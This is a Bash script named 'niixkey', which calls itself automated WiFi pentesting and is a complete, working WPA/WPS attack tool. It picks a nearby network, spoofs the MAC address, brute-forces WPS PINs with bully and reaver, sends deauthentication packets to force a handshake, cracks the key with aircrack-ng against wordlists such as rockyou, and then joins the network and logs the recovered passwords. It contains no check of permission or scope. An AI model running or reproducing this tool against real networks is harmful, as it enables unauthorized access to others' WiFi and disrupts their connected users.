#!/bin/bash
# niixkey 
# Version 1.61
# Author: techniix

# =====================[ CONFIGURATION ]=====================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

WORKSPACE="$HOME/niixkey_results"
WORDLIST_DIR="/usr/share/wordlists"
OUTPUT_FILE="$WORKSPACE/cracked_passwords.txt"
LOG_FILE="$WORKSPACE/niixkey.log"
SCAN_TIME=20
DEAUTH_COUNT=5

# =====================[ ASCII ART ]=====================
show_banner() {
    clear
    echo -e "${PURPLE}"
    echo " ███╗   ██╗██╗██╗██╗  ██╗"
    echo " ████╗  ██║██║██║╚██╗██╔╝"
    echo " ██╔██╗ ██║██║██║ ╚███╔╝  "
    echo " ██║╚██╗██║██║██║ ██╔██╗  "
    echo " ██║ ╚████║██║██║██╔╝ ██╗"
    echo " ╚═╝  ╚═══╝╚═╝╚═╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo "           >> Automated WiFi Pentesting <<"
    echo "---------------------------------------------------"
}

# =====================[ LOGGING ]=====================
log() {
    echo -e "$1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

# =====================[ DEPENDENCY MANAGEMENT ]=====================
install_dependencies() {
    log "${YELLOW}[*] Checking system dependencies...${NC}"
    
    declare -A tools=(
        ["aircrack-ng"]="aircrack-ng"
        ["iwconfig"]="wireless-tools"
        ["hcxdumptool"]="hcxdumptool"
        ["hashcat"]="hashcat"
        ["macchanger"]="macchanger"
        ["bully"]="bully"
        ["reaver"]="reaver"
        ["wpaclean"]="wpaclean"
    )

    missing=()
    for cmd in "${!tools[@]}"; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("${tools[$cmd]}")
            log "${RED}[X] Missing: $cmd${NC}"
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        log "${YELLOW}[!] Installing missing packages...${NC}"
        sudo apt update && sudo apt install -y "${missing[@]}" || {
            log "${RED}[X] Failed to install dependencies${NC}"
            exit 1
        }
    fi
    
    # Check and download wordlists if needed
    if [ ! -f "$WORDLIST_DIR/rockyou.txt" ]; then
        log "${YELLOW}[!] Downloading rockyou wordlist...${NC}"
        sudo wget -q "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt.gz" -O "$WORDLIST_DIR/rockyou.txt.gz"
        sudo gunzip "$WORDLIST_DIR/rockyou.txt.gz"
    fi
    
    log "${GREEN}[✓] All dependencies installed${NC}"
}

# =====================[ INTERFACE SELECTION ]=====================
select_interface() {
    log "${CYAN}[*] Available wireless interfaces:${NC}"
    
    INTERFACES=($(iw dev | awk '/Interface/{print $2}'))
    if [ ${#INTERFACES[@]} -eq 0 ]; then
        log "${RED}[X] No wireless interfaces found${NC}"
        exit 1
    fi

    for i in "${!INTERFACES[@]}"; do
        driver=$(ethtool -i "${INTERFACES[$i]}" 2>/dev/null | awk '/driver:/{print $2}')
        log "[$i] ${INTERFACES[$i]} (${driver:-unknown})"
    done

    while true; do
        read -p "Select interface number: " choice
        if [[ $choice =~ ^[0-9]+$ ]] && [ $choice -lt ${#INTERFACES[@]} ]; then
            SELECTED_IFACE="${INTERFACES[$choice]}"
            log "${GREEN}[+] Selected interface: $SELECTED_IFACE${NC}"
            return 0
        fi
        log "${RED}[X] Invalid selection${NC}"
    done
}

setup_monitor_mode() {
    log "${YELLOW}[*] Configuring monitor mode...${NC}"
    
    sudo airmon-ng check kill &>> "$LOG_FILE"
    sudo ip link set $SELECTED_IFACE down
    sudo macchanger -r $SELECTED_IFACE &>> "$LOG_FILE"
    sudo ip link set $SELECTED_IFACE up

    if sudo airmon-ng start $SELECTED_IFACE &>> "$LOG_FILE"; then
        MON_IFACE=$(iw dev | awk '/Interface/{print $2}' | head -1)
        log "${GREEN}[✓] Monitor mode enabled on $MON_IFACE${NC}"
        return 0
    else
        log "${RED}[X] Failed to enable monitor mode${NC}"
        return 1
    fi
}

# =====================[ TARGET SELECTION ]=====================
scan_networks() {
    log "${CYAN}[*] Scanning for targets (${SCAN_TIME} seconds)...${NC}"
    
    mkdir -p "$WORKSPACE"
    timeout $SCAN_TIME sudo airodump-ng $MON_IFACE -w $WORKSPACE/scan --output-format csv &>> "$LOG_FILE"

    TARGETS=()
    while IFS= read -r line; do
        TARGETS+=("$line")
    done < <(grep -E "WPA[2-3]" "$WORKSPACE/scan-01.csv" | awk -F',' '{print $1","$4","$6","$9}' | sort -u)

    if [ ${#TARGETS[@]} -eq 0 ]; then
        log "${RED}[X] No WPA networks found${NC}"
        return 1
    fi

    log "\n${GREEN}[+] Discovered networks:${NC}"
    echo "-------------------------------------"
    printf "%-4s %-18s %-8s %s\n" "NUM" "BSSID" "CHANNEL" "SSID"
    echo "-------------------------------------"
    
    for i in "${!TARGETS[@]}"; do
        IFS=',' read -r bssid channel power ssid <<< "${TARGETS[$i]}"
        printf "%-4s %-18s %-8s %s\n" "[$i]" "$bssid" "$channel" "$(echo "$ssid" | tr -d '"')"
    done

    while true; do
        read -p "Select target number: " choice
        if [[ $choice =~ ^[0-9]+$ ]] && [ $choice -lt ${#TARGETS[@]} ]; then
            IFS=',' read -r TARGET_BSSID TARGET_CHANNEL _ TARGET_SSID <<< "${TARGETS[$choice]}"
            TARGET_SSID=$(echo "$TARGET_SSID" | tr -d '"')
            
            log "\n${GREEN}[+] Selected target:${NC}"
            log "  SSID:    $TARGET_SSID"
            log "  BSSID:   $TARGET_BSSID"
            log "  Channel: $TARGET_CHANNEL"
            return 0
        fi
        log "${RED}[X] Invalid selection${NC}"
    done
}

# =====================[ ATTACK MODULES ]=====================
wps_attack() {
    log "${PURPLE}[*] Attempting WPS PIN attack...${NC}"
    
    # Try bully first (faster)
    log "${YELLOW}[*] Running bully...${NC}"
    timeout 300 sudo bully -b $TARGET_BSSID -c $TARGET_CHANNEL $MON_IFACE -v 3 &>> "$LOG_FILE"
    
    if [ $? -eq 0 ]; then
        CRACKED_PASS=$(sudo grep "WPA PSK" "$HOME/.bully/$TARGET_BSSID.run" | awk '{print $3}')
        if [ -n "$CRACKED_PASS" ]; then
            log "${GREEN}[✓] WPS PIN cracked: $CRACKED_PASS${NC}"
            return 0
        fi
    fi

    # Fallback to reaver
    log "${YELLOW}[*] Running reaver...${NC}"
    timeout 600 sudo reaver -i $MON_IFACE -b $TARGET_BSSID -vv -K 1 -d 5 -c $TARGET_CHANNEL &>> "$LOG_FILE"
    
    if [ $? -eq 0 ]; then
        CRACKED_PASS=$(sudo grep "WPA PSK" "$HOME/.reaver/$TARGET_BSSID.wpc" | awk '{print $NF}')
        if [ -n "$CRACKED_PASS" ]; then
            log "${GREEN}[✓] WPS PIN cracked: $CRACKED_PASS${NC}"
            return 0
        fi
    fi
    
    return 1
}

capture_handshake() {
    log "${PURPLE}[*] Starting WPA handshake capture...${NC}"
    HANDSHAKE_FILE="$WORKSPACE/handshake_$(date +%s).cap"

    timeout 30 sudo airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w "$HANDSHAKE_FILE" $MON_IFACE &>> "$LOG_FILE" &
    AIRODUMP_PID=$!

    sleep 5
    log "${YELLOW}[*] Sending $DEAUTH_COUNT deauth packets...${NC}"
    sudo aireplay-ng --deauth $DEAUTH_COUNT -a $TARGET_BSSID $MON_IFACE &>> "$LOG_FILE"

    for i in {1..10}; do
        if sudo aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
            kill $AIRODUMP_PID &>> "$LOG_FILE"
            log "${GREEN}[✓] Handshake captured!${NC}"
            return 0
        fi
        sleep 2
    done

    kill $AIRODUMP_PID &>> "$LOG_FILE"
    log "${RED}[X] Failed to capture handshake${NC}"
    return 1
}

crack_password() {
    log "${PURPLE}[*] Starting password cracking...${NC}"
    
    # Try multiple wordlists in order
    WORDLISTS=(
        "$WORDLIST_DIR/rockyou.txt"
        "$WORDLIST_DIR/passwords.txt"
        "$WORDLIST_DIR/darkc0de.txt"
    )

    for wordlist in "${WORDLISTS[@]}"; do
        if [ -f "$wordlist" ]; then
            log "${YELLOW}[*] Trying wordlist: $(basename "$wordlist")${NC}"
            
            if [[ "$wordlist" == *.gz ]]; then
                gunzip -c "$wordlist" | aircrack-ng -w - -b $TARGET_BSSID "$HANDSHAKE_FILE" | tee -a "$LOG_FILE"
            else
                aircrack-ng -w "$wordlist" -b $TARGET_BSSID "$HANDSHAKE_FILE" | tee -a "$LOG_FILE"
            fi

            if grep -q "KEY FOUND" "$LOG_FILE"; then
                CRACKED_PASS=$(grep "KEY FOUND" "$LOG_FILE" | tail -1 | awk '{print $4}')
                log "${GREEN}[✓] Password found: $CRACKED_PASS${NC}"
                return 0
            fi
        fi
    done

    log "${RED}[X] Password not found in wordlists${NC}"
    return 1
}

# =====================[ AUTO CONNECTION ]=====================
connect_to_wifi() {
    log "${CYAN}[*] Connecting to $TARGET_SSID...${NC}"
    
    # Clean up monitor mode
    sudo airmon-ng stop $MON_IFACE &>> "$LOG_FILE"
    sudo ip link set $SELECTED_IFACE down
    sudo iwconfig $SELECTED_IFACE mode managed
    sudo ip link set $SELECTED_IFACE up

    # Generate wpa_supplicant config
    WPA_CONF="/tmp/wpa_supplicant.conf"
    cat > "$WPA_CONF" << EOF
network={
    ssid="$TARGET_SSID"
    psk="$CRACKED_PASS"
}
EOF

    # Connect
    sudo wpa_supplicant -B -i $SELECTED_IFACE -c "$WPA_CONF" -D nl80211,wext &>> "$LOG_FILE"
    sudo dhclient $SELECTED_IFACE &>> "$LOG_FILE"

    # Verify connection
    sleep 5
    if iwconfig $SELECTED_IFACE 2>/dev/null | grep -q "$TARGET_SSID"; then
        IP_ADDR=$(ip -o -4 addr show $SELECTED_IFACE | awk '{print $4}')
        log "${GREEN}[✓] Successfully connected!${NC}"
        log "  Network: $TARGET_SSID"
        log "  Password: $CRACKED_PASS"
        log "  IP: $IP_ADDR"

        # Save results
        echo "==================================" | tee -a "$OUTPUT_FILE"
        echo "SSID: $TARGET_SSID" | tee -a "$OUTPUT_FILE"
        echo "BSSID: $TARGET_BSSID" | tee -a "$OUTPUT_FILE"
        echo "Password: $CRACKED_PASS" | tee -a "$OUTPUT_FILE"
        echo "IP: $IP_ADDR" | tee -a "$OUTPUT_FILE"
        echo "Date: $(date)" | tee -a "$OUTPUT_FILE"
        echo "==================================" | tee -a "$OUTPUT_FILE"
        
        return 0
    fi

    log "${RED}[X] Failed to connect automatically${NC}"
    log "${YELLOW}[!] You can try connecting manually with:${NC}"
    log "  SSID: $TARGET_SSID"
    log "  Password: $CRACKED_PASS"
    return 1
}

# =====================[ MAIN WORKFLOW ]=====================
automated_attack() {
    # Try WPS attack first (faster)
    if wps_attack; then
        connect_to_wifi
        return $?
    fi

    # Fallback to handshake capture
    if capture_handshake; then
        if crack_password; then
            connect_to_wifi
            return $?
        fi
    fi

    return 1
}

# =====================[ CLEANUP ]=====================
cleanup() {
    log "${YELLOW}[*] Cleaning up...${NC}"
    sudo airmon-ng stop $MON_IFACE &>> "$LOG_FILE" 2>/dev/null
    sudo service network-manager restart &>> "$LOG_FILE"
    log "${GREEN}[✓] Operation complete. Results saved in:${NC}"
    log "  - Passwords: $OUTPUT_FILE"
    log "  - Full logs: $LOG_FILE"
}

# =====================[ MAIN EXECUTION ]=====================
main() {
    show_banner
    install_dependencies
    select_interface
    setup_monitor_mode || exit 1
    scan_networks || exit 1
    automated_attack
    cleanup
}

# Start execution
main
